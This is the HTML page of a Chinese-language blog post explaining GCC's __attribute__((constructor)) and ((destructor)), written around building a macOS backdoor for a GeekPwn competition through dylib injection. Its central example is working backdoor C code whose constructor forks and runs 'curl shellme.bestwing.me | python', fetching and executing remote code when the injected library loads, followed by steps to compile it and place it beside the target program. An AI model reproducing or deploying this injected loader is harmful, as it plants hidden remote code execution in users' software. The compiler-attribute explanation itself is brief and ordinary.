@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言前端时间，在打geekpwn的时候，需要做后门，一开始我做的是macos的后门，用的是 macos dylib注入（劫持？）。 这里可以提一下，我这里用的是这个项目insert_dylib，曾经看过有人用这个项目，去掉了macos上企业微信的水印，所以一直有点印象。 使用方式如下：insert @executable_path src dst 最后能类似这样的一个效果：  红色框的，是我注入的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="编译属性 &quot;__attribute__&quot; 的一些简单认识">
+<meta property="og:url" content="https://bestwing.me/Compile_attribute_properties.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="前言前端时间，在打geekpwn的时候，需要做后门，一开始我做的是macos的后门，用的是 macos dylib注入（劫持？）。 这里可以提一下，我这里用的是这个项目insert_dylib，曾经看过有人用这个项目，去掉了macos上企业微信的水印，所以一直有点印象。 使用方式如下：insert @executable_path src dst 最后能类似这样的一个效果：  红色框的，是我注入的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123215413.png">
+<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123220244.png">
+<meta property="article:published_time" content="2019-11-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-11-23T14:09:00.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="attribute">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123215413.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>编译属性 &#34;__attribute__&#34; 的一些简单认识</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/Goodbye_2019,Hello_2020!.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019-geekpwn-writeup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Compile_attribute_properties.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Compile_attribute_properties.html&text=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Compile_attribute_properties.html&is_video=false&description=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=编译属性 &#34;__attribute__&#34; 的一些简单认识&body=Check out this article: https://bestwing.me/Compile_attribute_properties.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Compile_attribute_properties.html&name=编译属性 &#34;__attribute__&#34; 的一些简单认识&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Compile_attribute_properties.html&t=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attribute"><span class="toc-number">2.</span> <span class="toc-text">attribute</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">认识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">2.2.</span> <span class="toc-text">例子</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        编译属性 &#34;__attribute__&#34; 的一些简单认识
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-11-22T16:00:00.000Z" itemprop="datePublished">2019-11-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Summary/">Summary</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/attribute/" rel="tag">attribute</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前端时间，在打geekpwn的时候，需要做后门，一开始我做的是macos的后门，用的是 macos dylib注入（劫持？）。</p>
+<p>这里可以提一下，我这里用的是这个项目<a href="https://github.com/Tyilo/insert_dylib">insert_dylib</a>，曾经看过有人用这个项目，去掉了macos上企业微信的水印，所以一直有点印象。</p>
+<p>使用方式如下：insert @executable_path src dst</p>
+<p>最后能类似这样的一个效果：</p>
+<p><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123215413.png"></p>
+<p>红色框的，是我注入的dylib 程序，那么另外一个问题来了，如何让在程序启动前或者后，执行外面的代码呢？这里就是这个文章想提的一个东西。</p>
+<blockquote>
+<p>什么是 @executable_path ？</p>
+<p> executable_path 是macOS的链接路径的解决方案之一，除此之外还有 @loader_path 和 @rpath，具体细节不在这里表述，感兴趣可以自己搜一下。</p>
+</blockquote>
+<h2 id="attribute"><a href="#attribute" class="headerlink" title="attribute"></a><strong>attribute</strong></h2><h3 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h3><p>首先，什么是 <strong><strong>attribute</strong></strong> ？ </p>
+<p><code>__attribute__</code>是一个编译属性，用于向编译器描述特殊的标识、错误检查或高级优化。它是GNU C特色之一，系统中有许多地方使用到。 <code>__attribute__</code>可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute)等。</p>
+<p>接着如何利用该编译属性达到我们想要的效果？</p>
+<p>这里我们要认识两个编译属性</p>
+<ol>
+<li><strong>attribute</strong>((constructor))</li>
+<li><strong>attribute</strong>((destructor))</li>
+</ol>
+<p>这两个带着  <code>__attribute__</code> 编译属性的标识并不相同，一个是constructor 一个是 destructor。</p>
+<p>从字面上理解 constructor 是构造器的意思，destructor 是 a refuse-burning furnace（焚化炉的意思？），我们可以简单的理解其为c++ 函数里的构造函数和析构函数，其特点就是在于：</p>
+<p><strong>attribute</strong>((constructor)) 确保此函数在 在<code>main</code>函数被调用之前调用，iOS中在<code>+load</code>之后<code>main</code>之前执行。<br> <code>constructor</code>和<code>destructor</code>会在<code>ELF</code>文件中添加两个段-<code>.ctors</code>和<code>.dtors</code>。当动态库或程序在加载时，会检查是否存在这两个段，如果存在执行对应的代码。</p>
+<p><strong>attribute</strong>((destructor))，确保此函数在 在<code>main</code>函数被调用之后调。</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>我这里可以放一个，当时macos后面的一个例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="meta-string">&quot;shellme.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid,ppid;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid ==<span class="number">0</span>)&#123;</span><br><span class="line">        ppid = fork();</span><br><span class="line">        <span class="keyword">if</span> (ppid == <span class="number">0</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;touch /tmp/hacker&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;curl shellme.bestwing.me | python &gt; /dev/null &amp;&quot;</span>);</span><br><span class="line"><span class="comment">//        system(&quot;./shell&quot;);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))<span class="function"><span class="keyword">int</span> <span class="title">fuck</span><span class="params">()</span></span>&#123;</span><br><span class="line">    load();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==== Hacked by chaitin ====\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们这里可以选择Xcode 进行编译，选择编译成dylib，或者直接 gcc test.c -shared 编译也可。</p>
+<p><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123220244.png"></p>
+<p>最后改成相应的名字，放到被注入的程序的对应目录里即可。</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attribute"><span class="toc-number">2.</span> <span class="toc-text">attribute</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">认识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">2.2.</span> <span class="toc-text">例子</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Compile_attribute_properties.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Compile_attribute_properties.html&text=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Compile_attribute_properties.html&is_video=false&description=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=编译属性 &#34;__attribute__&#34; 的一些简单认识&body=Check out this article: https://bestwing.me/Compile_attribute_properties.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Compile_attribute_properties.html&title=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Compile_attribute_properties.html&name=编译属性 &#34;__attribute__&#34; 的一些简单认识&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Compile_attribute_properties.html&t=编译属性 &#34;__attribute__&#34; 的一些简单认识"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
